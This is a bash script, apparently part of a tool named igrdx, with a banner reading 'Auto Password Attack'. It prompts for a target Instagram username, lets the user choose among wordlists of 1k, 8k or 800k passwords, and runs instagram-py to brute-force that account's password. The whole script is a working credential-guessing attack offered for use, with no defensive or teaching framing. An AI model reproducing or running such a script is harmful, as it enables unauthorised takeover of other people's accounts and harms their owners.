#wordlist selection.
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
#coding section starts :)
clear
echo
echo '
_____  _______   __      ____  _____   _____ 
|  __ \|  __ \ \ / /     / __ \|  __ \ / ____|
| |__) | |  | \ V /_____| |  | | |__) | |  __ 
|  _  /| |  | |> <______| |  | |  _  /| | |_ |
| | \ \| |__| / . \     | |__| | | \ \| |__| |
|_|  \_\_____/_/ \_\     \____/|_|  \_\\_____|
                [#] Auto Password Attack [#]
' |lolcat
printf "\n"
printf "                \e[101m\e[1;77m  >>  Script By Rahul Pipliwal << \e[0m\n"
printf "\n"
printf "       \e[100m\e[1;77m >>  Website : \e[1;96m Pipliwal.tk \e[100m\e[1;77m << \e[0m\n"
printf "\n"
echo
read -p "[#] User Name : " usrnm
echo
echo -e "$grn              [+]$red Type$ylo 1$red FOR 1k Passwords$grn
              [+]$red Type$ylo 2$red FOR 8K Passwords$grn
              [+]$red Type$ylo 3$red FOR 800k Passwords $rset"
echo
read -p "[#] Enter Selected Number: " marks
echo 
if [ $marks = 1 ]
then
    instagram-py --username $usrnm --password-list $HOME/igrdx/pass/pass1.txt 
 
elif [ $marks = 2 ]
then
    instagram-py --username $usrnm --password-list $HOME/igrdx/pass/pass2.txt
 
elif [ $marks = 3 ]
then
    instagram-py --username $usrnm --password-list $HOME/igrdx/pass/pass3.txt
else
echo
echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"
echo
sleep 50.0
cd $HOME
fi
sleep 50.0
cd $HOME/igrdx
bash igrdx.sh
